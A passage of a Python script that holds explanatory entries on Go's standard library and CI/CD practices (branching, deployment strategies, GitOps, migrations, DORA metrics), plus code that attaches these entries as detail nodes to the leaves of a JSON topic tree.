        "Production-quality building blocks: `net/http` (server + client), `sync.{Mutex, RWMutex, WaitGroup, Pool}`, `encoding/json` for marshaling.",
        "Wide enough for most workloads — Go services often ship with **only stdlib** — but `encoding/json` reflection is slow and `net/http` has subtle defaults (timeouts!).",
        "An HTTP service whose entire dependency footprint is the standard library: `net/http` for the server, `database/sql` for Postgres, `log/slog` for structured logs.",
    ),
    # ───────────────── CI/CD
    "CI/CD > CI fundamentals": (
        "Continuous Integration: every commit triggers an automated pipeline — checkout → install deps → build → test → package → publish artifact.",
        "Catches integration breaks immediately and produces deployable artifacts on every green commit, but requires fast pipelines and a culture of fixing red builds first.",
        "A GitHub Actions workflow on every push: checkout, restore dep cache, run `go test ./…`, build a multi-arch container, push to ECR tagged with the commit SHA.",
    ),
    # ───── CI/CD > Branching strategies
    "CI/CD > Branching strategies > Trunk-based development": (
        "All developers commit to a single mainline (`main`) at least daily; long-lived branches are forbidden. Risky changes hide behind feature flags.",
        "Eliminates merge hell and keeps the system continuously releasable, but demands a strong test suite and feature-flag discipline.",
        "Google and Meta scale: thousands of engineers committing to one trunk daily; feature flags gate unfinished work in production.",
    ),
    "CI/CD > Branching strategies > GitFlow": (
        "Long-lived `develop` and `main`, plus `feature/*`, `release/*`, and `hotfix/*` branches with formal merge rules.",
        "Maps cleanly to versioned releases and parallel maintenance, but heavy ceremony and merge complexity for fast-moving web apps.",
        "An on-prem product shipping a tagged release every quarter, maintaining `release/2024.01` for hotfixes while `develop` keeps moving.",
    ),
    "CI/CD > Branching strategies > GitHub Flow": (
        "Lightweight: branch from `main`, open a PR, get reviews/CI, merge to `main`, deploy. No `develop` branch.",
        "Simple and fits CD for SaaS, but assumes you can ship from `main` at any time — needs strong CI and feature flags.",
        "A typical SaaS team: every PR runs CI + preview env, gets one approval, squash-merges to main, and triggers an automated production deploy.",
    ),
    "CI/CD > Branching strategies > Release branches": (
        "Cut a `release/x.y` branch when stabilising a version; only fixes flow into it, while `main` keeps moving forward.",
        "Lets you ship a stable version while continuing to develop, but you pay the merge tax of cherry-picking fixes between branches.",
        "A SDK team cutting `release/v3.2` to harden for a customer rollout while `main` already has v3.3 work; critical fixes cherry-picked to both.",
    ),
    # ───── CI/CD > Deployment strategies
    "CI/CD > Deployment strategies > Recreate": (
        "Stop the old version entirely, then start the new — guaranteed downtime during the swap.",
        "Simplest possible strategy with no version-skew concerns, but the downtime makes it unacceptable for most production services.",
        "A nightly batch processor with no live users, redeployed by stopping the old container and starting the new one once it's healthy.",
    ),
    "CI/CD > Deployment strategies > Rolling": (
        "Replace instances of the old version with the new one a few at a time, keeping enough capacity online to serve traffic.",
        "Zero-downtime by default and built into K8s/ECS, but you run mixed versions during the rollout — schemas and APIs must be backward-compatible.",
        "A K8s `Deployment` with `maxSurge: 1, maxUnavailable: 0` rolling 30 pods one at a time over 5 minutes, with `readinessProbe` gating each new pod.",
    ),
    "CI/CD > Deployment strategies > Blue / Green": (
        "Two parallel identical environments; new version goes to the idle one (\"green\"), traffic is switched at the LB once green is verified.",
        "Instant rollback (flip traffic back to blue), at the cost of doubling the running fleet during the cutover and stateful systems being hard to duplicate.",
        "An ALB with two target groups; deploys push to the inactive group, smoke tests run against it, then a target-group swap moves 100% of traffic in seconds.",
    ),
    "CI/CD > Deployment strategies > Canary": (
        "Send a small percentage of traffic to the new version and monitor SLIs; ramp up gradually if it's healthy, roll back if not.",
        "Catches bugs that only show under real traffic with limited blast radius, but requires good observability + automated rollback to be safe.",
        "Argo Rollouts shifting 1% → 10% → 50% → 100% of `/checkout` traffic to v2 over 30 minutes, auto-aborting if `error_rate > 1%` or `p99 > 500ms`.",
    ),
    "CI/CD > Deployment strategies > Shadow / Mirror": (
        "Production traffic is copied to the new version in parallel; responses from the shadow are **discarded**, so users see only the old version's response.",
        "Risk-free way to test the new version under real load and data, but doubles backend cost and breaks for non-idempotent traffic (writes).",
        "Mirroring 100% of the read traffic on `/search` to a new ranking service via Envoy `request_mirror_policies`, comparing latency/results offline before any real cutover.",
    ),
    "CI/CD > Deployment strategies > Feature flags": (
        "Decouple deploy from release: ship code dark, then turn it on for users via a remote-controlled flag (per-user, per-tenant, per-region).",
        "Enables trunk-based development, instant kill switches, and incremental rollouts, but flags become technical debt if not retired aggressively.",
        "LaunchDarkly toggle gating a new pricing engine: deployed to all pods two weeks ago, enabled for 1% of traffic today, full rollout next week — kill switch one click away.",
    ),
    # ───── CI/CD > Other
    "CI/CD > Environments": (
        "Distinct deploy targets — dev, staging, production — plus increasingly **ephemeral PR previews** for review and integration testing.",
        "Catches issues at progressively higher fidelity, but environment drift (\"staging is different from prod\") is a constant operational tax.",
        "A platform that spins up a per-PR environment via Terraform + ArgoCD on PR open, deletes it on close — reviewers click a unique URL to test the change.",
    ),
    "CI/CD > Infrastructure as Code": (
        "Provision and manage cloud resources by code (Terraform, Pulumi, CloudFormation) rather than clicks; state is version-controlled and reviewable.",
        "Reproducible, auditable, and reviewable infrastructure, but state-file ownership and drift between code and reality are real operational concerns.",
        "A monorepo with `terraform/` modules for VPC, EKS, RDS, etc.; PRs run `terraform plan` in CI and merging triggers `apply` against a remote state in S3 + DynamoDB.",
    ),
    "CI/CD > GitOps": (
        "Git is the single source of truth for desired cluster state; an in-cluster operator (ArgoCD, Flux) reconciles the live state to match.",
        "Auditable change history and self-healing drift correction, but coupling deploy to git means broken git or operator outages block all deploys.",
        "ArgoCD watching `infra-repo/clusters/prod/` and continuously reconciling — a developer's PR merging into the manifests triggers a deploy 30s later, fully tracked in git.",
    ),
    "CI/CD > DB migrations": (
        "Schema changes versioned with the code; **forward-only** migrations preferred, with the **expand-contract** pattern for breaking changes.",
        "Keeps schema in step with code and reviewable as PRs, but breaking changes require multi-deploy choreography (add column → backfill → switch reads → drop column).",
        "Adding a NOT NULL column without downtime: deploy 1 adds nullable col + backfill; deploy 2 makes app write it; deploy 3 makes it NOT NULL once 100% of rows are populated.",
    ),
    "CI/CD > Rollback strategies": (
        "How you undo a bad deploy: redeploy the previous artifact, switch traffic back (blue/green), abort canary, or `kubectl rollout undo`.",
        "Fast rollback is the safety net that lets you ship aggressively, but stateful changes (DB migrations) often can't be cleanly rolled back.",
        "A canary auto-aborting and `kubectl rollout undo deployment/api` shifting traffic back to the previous ReplicaSet within 60 seconds of an error-rate spike.",
    ),
    "CI/CD > DORA metrics": (
        "Four metrics from the DORA / *Accelerate* research: **Deployment frequency**, **Lead time for changes**, **Change failure rate**, **Mean time to restore (MTTR)**.",
        "Empirically separates elite teams from low performers and is hard to game, but easy to misuse as a stick — context matters.",
        "A platform team's quarterly review showing deployment frequency rising from weekly → daily, lead time falling from 4 days → 4 hours, CFR holding at 8% — the Accelerate \"high-performer\" band.",
    ),
}


# ─── Apply structure + details ────────────────────────────────────────────
def apply_details_to_new_root(root: dict, missing: list[str]) -> int:
    """Walk a single new root tree, attach a Detail child to every leaf
    using DETAILS, and return the count attached."""
    applied = 0

    def walk(node: dict, path: list[str]) -> None:
        nonlocal applied
        children = node.get("children")
        if children:
            for c in children:
                walk(c, path + [c["title"]])
            return
        # leaf
        full_path = " > ".join(path)
        if full_path not in DETAILS:
            missing.append(full_path)
            return
        d, t, x = DETAILS[full_path]
        node["children"] = [{"title": detail_title(d, t, x)}]
        applied += 1

    walk(root, [root["title"]])
    return applied


def main() -> None:
    data = json.loads(JSON_PATH.read_text(encoding="utf-8"))
    existing_titles = {c["title"] for c in data["children"]}

    skipped: list[str] = []
    appended: list[str] = []
    missing: list[str] = []
    total_details = 0

    for new_root in NEW_ROOTS:
        if new_root["title"] in existing_titles:
            skipped.append(new_root["title"])
            continue
        n = apply_details_to_new_root(new_root, missing)
        total_details += n
        data["children"].append(new_root)
        appended.append(f"{new_root['title']} ({n} leaves)")

    if missing:
        print("MISSING DETAIL ENTRIES:")
        for m in missing:
            print(f"  - {m}")
        raise SystemExit(1)

    JSON_PATH.write_text(
        json.dumps(data, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )

    print("Appended root branches:")
    for a in appended:
        print(f"  + {a}")
    if skipped:
        print("Skipped (already present):")
        for s in skipped:
            print(f"  · {s}")
    print(f"Total new detail nodes added: {total_details}")


if __name__ == "__main__":
    main()
